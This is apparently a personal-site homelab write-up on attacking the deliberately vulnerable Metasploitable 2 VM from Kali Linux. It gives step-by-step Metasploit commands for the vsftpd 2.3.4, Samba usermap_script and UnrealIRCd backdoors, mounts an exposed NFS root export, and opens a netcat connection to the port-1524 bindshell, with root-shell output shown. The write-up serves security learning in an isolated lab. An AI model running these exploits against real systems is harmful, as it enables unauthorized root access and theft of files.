<?php 
$basedir = '../../';
include($basedir.'includes/header.php'); 
?> 

      <section>

      <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">## @Author: Sean Bachiller
</span></code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/59718043/125168322-08cbe180-e173-11eb-940a-71279dd33fba.gif" alt="cmd by https://dribbble.com/iskragraphics" /></p>
<h1 id="ctflearn">Kali Linux + Metasploitable Homelab Writeup</h1>
<p>We are going to explore and simulate a pentesting lab environment with
    Kali Linux as the attacker and Metasploitable as the target. This
    is one of the most basic and fundamental setups if you want to get started with InfoSec.
</p>

<h3>Resources required:</h3>
<ul>
  <li><a href="https://www.vmware.com/ca/products/workstation-pro/workstation-pro-evaluation.html">VMWare Workstation (or any virtualization software)</a></li>
  <li><a href="https://www.kali.org/get-kali/">Kali Linux VM</a></li>
  <li><a href="https://sourceforge.net/projects/metasploitable/">Metasploitable 2 VM</a></li>
</ul>
<h3>Topology:</h3>
<p><img src="https://user-images.githubusercontent.com/59718043/125169299-8134a180-e177-11eb-951d-92308d01d8ee.png" alt="kali linux metasploitable topology" /></p>

<p>
    Assuming that you have already gone through the process of installing and configuring both VMs, we're going to dive right into
it.
</p>


<table class="table table-striped table-bordered">
<thead>
<tr>
<th>Kali Linux</th>
<th>Metasploitable</th>
</tr>
</thead>
<tbody>
<tr>
<td>172.16.47.128</td>
<td>172.16.47.129</td>
</tr>
</tbody>
</table>
<p>
At this point, we should run an nmap to see what we're dealing with.
I don't need to go into much detail about the output, just bare in mind that
our target has tons of vulnerabilities. 
</p>
<br/><br/>
<h1>Exploiting FTP</h1>

<p>
The first entry point that we're going to exploit is the File Transfer Protocol.
FTP is a type of layer 7 network protocol used to transfer files between
systems on TCP ports 20/21. When left misconfigured or outdated, this 
protocol could be used as a backdoor.
</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">Output:
PORT     STATE     SERVICE     VERSION
21/tcp   open      ftp         vsftpd 2.3.4  
</span></code></pre></div></div>
<h3>Metasploit - Pentesting Framework</h3>
<p><img src="https://user-images.githubusercontent.com/59718043/125181890-4bbfa080-e1d7-11eb-868d-44fb95715396.png" alt="metasploit logo" /></p>
<p>
We're going to use <a href="https://www.metasploit.com/">Metasploit</a>,
a powerful exploit database and framework for pentesting, to search for
<b>vsftpd 2.3.4</b> (VERSION)

</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">~$ msfconsole 
</span></code></pre></div></div>
<p>
  Search the module database for a vsftpd 2.3.4 exploit:
</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">search vsftpd 2.3.4
</span></code></pre></div></div>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">Output:
#  Name                                 Disclosure Date  Rank      Check  Description
-  ----                                 ---------------  ----      -----  ----------- 
0  exploit/unix/ftp/vsftpd_234_backdoor 2011-07-03       excellent No     VSFTPD v2.3.4 Backdoor Command Execution    
</span></code></pre></div></div>

<p>
We can then use this exploit by typing:
</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">use exploit/unix/ftp/vsftpd_234_backdoor
</span></code></pre></div></div>

<p>
The next step would be to run <b>show options</b> to see what settings are available for this module.
</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">show options
</span></code></pre></div></div>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">Output:
Name    Current Setting  Required  Description
----    ---------------  --------  ----------- 
RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with
                                     syntax 'file:&#60;path&#62;'
RPORT   21               yes       The target port (TCP)                                         

</span></code></pre></div></div>

<p>
The RHOSTS option can be set to the target's IP address, 172.16.47.129.
</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">set RHOSTS 172.16.47.129
</span></code></pre></div></div>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">Output:
RHOSTS => 172.16.47.129
</span></code></pre></div></div>

<p>
At this point, we can run the exploit :)
</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">exploit
</span></code></pre></div></div>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">Output:
[*] 172.16.47.129:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 172.16.47.129:21 - USER: 331 Please specify the password.
[+] 172.16.47.129:21 - Backdoor service has been spawned, handling ...
[+] 172.16.47.129:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (0.0.0.0:0 -> 172.16.47.129:6200) at 2021-04-22 23:48:16 -0400   
</span></code></pre></div></div>

<p>
Executing this module should give us a remote shell as root.
</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">id
</span></code></pre></div></div>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">Output:
uid=0(root) gid=0(root)
</span></code></pre></div></div>

<br/><br/>
<h1>Exploiting NFS</h1>
<p><img src="https://user-images.githubusercontent.com/59718043/125182809-1b7c0000-e1df-11eb-9442-25209f05283c.png" alt="nfs design" /></p>
<p>
A Network File System is a client/server application used for remote file sharing
within a network. This is the next vulnerability we're going to attack.
<br/><br/>
To show the available NFS exports of a server, we can use the command <b>showmount</b>.
</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">showmount -e 172.16.47.129
</span></code></pre></div></div>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">Output:
Export list for 172.16.47.129:
/ *  
</span></code></pre></div></div>

<p>
We need to create a directory to store the folders in and mount the NFS export
specified by the <b>-t</b> option.
</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">mkdir /tmp/meta
</span></code></pre></div></div>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">mount -t nfs 172.16.47.129:/ /tmp/meta
</span></code></pre></div></div>

<p>
Check out <b>/tmp/meta</b> (or the folder you chose to mount the export on):
</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">ls /tmp/meta
</span></code></pre></div></div>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">Output:
bin  cdrom  etc  initrd      lib         media  nohup.out  proc  sbin  sys  usr  vmlinuz
boot dev    home initrd.img  lost+found  mnt    opt        root  srv   tmp  var
</span></code></pre></div></div>

<p>
This output shows that we have successfully stolen all of the root directory's contents.
</p>
<br/><br/>

<h1>Exploiting Samba</h1>

<p>
We're going to approach this vulnerability with Metasploit. The execution is similar to our FTP exploit.
</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">msfconsole
</span></code></pre></div></div>
<p>Search for a Samba exploit:</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">search samba
</span></code></pre></div></div>
<p>Use the module:</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">use exploit/multi/samba/usermap_script
</span></code></pre></div></div>
<p>Set the RHOSTS option to our target's address:</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">set RHOSTS 172.16.47.129
</span></code></pre></div></div>
<p>We also need to set the <b>LHOST</b> to our attacker's address instead of 
the default value, which is a loopback address.
</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">Output:
LHOST => 172.16.47.128
</span></code></pre></div></div>
<p>Exploit:</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">exploit
</span></code></pre></div></div>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">Output:
[*] Started reverse TCP handler on 172.16.47.128:4444
[*] Command shell session 1 opened (172.16.47.128:4444 -> 172.16.47.129:45282) at 2021-04-27 19:46:32 -0400
</span></code></pre></div></div>
<p>Remote shell established:</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">id
</span></code></pre></div></div>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">Output:
uid=0(root) gid=0(root)
</span></code></pre></div></div>
<p>
This output displays our successful attempt to break into the machine using the Samba
vulnerability exploit module via Metasploit.
</p>
<br/><br/>

<h1>Exploiting IRC</h1>
<p><img src="https://user-images.githubusercontent.com/59718043/125184094-073d0080-e1e9-11eb-98d5-216eead56641.gif" alt="irc chat gif" /></p>

<p>
Internet Relay Chat (IRC) is a protocol that facilitates communication in the form 
of text. In this section, we will be using a backdoor. For the sake of 
demonstration, we will be using Metasploit again to perform this attack.

<br/><br/>
Run Metasploit:
</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">msfconsole
</span></code></pre></div></div>

<p>Search for an IRC exploit:</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">search irc
</span></code></pre></div></div>

<p>Use the module:</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">use exploit/unix/irc/unreal_ircd_3281_backdoor
</span></code></pre></div></div>

<p>Set RHOSTS:</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">set RHOSTS 172.16.47.129
</span></code></pre></div></div>

<p>Search for payloads (we need to set this for the module to work):</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">show payloads
</span></code></pre></div></div>

<p>Set the payload:</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">set PAYLOAD payload/cmd/unix/reverse
</span></code></pre></div></div>

<p>Set LHOST:</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">set LHOST 172.16.47.128
</span></code></pre></div></div>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">Output:
LHOST => 172.16.47.128
</span></code></pre></div></div>

<p>Attack!</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">exploit
</span></code></pre></div></div>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">Output:
[*] Started reverse TCP double handler on 172.16.47.128:4444
[*] 172.16.47.129:6667 - Connected to 172.16.47.129:6667 ...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname ...
[*] 172.16.47.129:6667 - Sending backdoor command ...
[*] Accepted the first client connection ...
[*] Accepted the second client connection ...
[*] Command: echo GwGEpaOh8wPiL0Ad;
[*] Writing to socket A
[*] Writing to socket B 
[*] Reading from sockets ... 
[*] Reading from socket B
[*] B: "GwGEpaOh8wPiL0Ad\r\n"
[*] Matching ...
[*] A is input ...
[*] Command shell session 1 opened (172.16.47.128:4444 -> 172.16.47.129:35119) at 2021-04-27 21:07:02 -0400 
</span></code></pre></div></div>

<p>Verify our access:</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">id
</span></code></pre></div></div>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">Output:
uid=0(root) gid=0(root)
</span></code></pre></div></div>

<p>
We have successfully used a backdoor via Metasploit to access our target
through an IRC vulnerability.
</p>

<h1>Exploiting Port 1524/TCP Bindshell</h1>
<p><img src="https://user-images.githubusercontent.com/59718043/125225107-acfd7780-e29c-11eb-8b9f-80657c78028d.jpg" alt="backdoor" /></p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">1524/tcp open   bindshell   Metasploitable root shell
</span></code></pre></div></div>
<p>
<b>Bindshell</b> is a bash shell that is bound to a port. It has a listener
running that can be easily manipulated by an attacker to gain remote access.
<br /><br/>
The easiest way to gain access to this machine is by using <a href="https://en.wikipedia.org/wiki/Netcat">Netcat</a>. 

</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">nc -nv 172.16.47.129 1524
</span></code></pre></div></div>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">Output:
(UNKNOWN) [172.16.47.129] 1524 (ingreslock) open
root@metasploitable:/#
</span></code></pre></div></div>

<p>This returns a shell (notice the prompt), giving us access to Metasploitable.</p>
<br /><br />

<h1>Sources</h1>

<table class="table table-striped table-bordered">
<thead>
<tr>
<th>Subject</th>
<th>Link</th>
</tr>
</thead>
<tbody>
<tr>
<td>Metasploitable VM</td>
<td><a href="https://sourceforge.net/projects/metasploitable/">https://sourceforge.net/projects/metasploitable/</a></td>
</tr>
<tr>
<td>Kali Linux VM</td>
<td><a href="https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/">https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/</a></td>
</tr>
<tr>
<td>What is a Network File System (NFS)?</td>
<td><a href="https://searchenterprisedesktop.techtarget.com/definition/Network-File-System">https://searchenterprisedesktop.techtarget.com/definition/Network-File-System</a></td>
</tr>
<tr>
<td>View Available Exports on an NFS Server</td>
<td><a href="https://www.jamescoyle.net/how-to/1019-view-available-exports-on-an-nfs-server">https://www.jamescoyle.net/how-to/1019-view-available-exports-on-an-nfs-server</a></td>
</tr>
<tr>
<td>Internet Relay Chat Wiki</td>
<td><a href="https://en.wikipedia.org/wiki/Internet_Relay_Chat">https://en.wikipedia.org/wiki/Internet_Relay_Chat</a></td>
</tr>
<tr>
<td>Bind Shells</td>
<td><a href="https://medium.com/@PenTest_duck/bind-vs-reverse-vs-encrypted-shells-what-should-you-use-6ead1d947aa9">https://medium.com/@PenTest_duck/bind-vs-reverse-vs-encrypted-shells-what-should-you-use-6ead1d947aa9</a></td>
</tr>
<tr>
<td>Netcat Wiki</td>
<td><a href="https://en.wikipedia.org/wiki/Netcat">https://en.wikipedia.org/wiki/Netcat</a></td>
</tr>
</tbody>
</table>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">## @Author: Sean Bachiller
## @Date: Jul 11 2021
</span></code></pre></div></div>

<div class="page-nav">
<a href="/index.php" class="previous round">&#8249;Previous</a>
<!--<a href="#" class="next round">Next&#8250;</a>-->
</div>

      </section>
<?php 
$basedir = '../../';
include($basedir.'includes/footer.php'); 
?> 
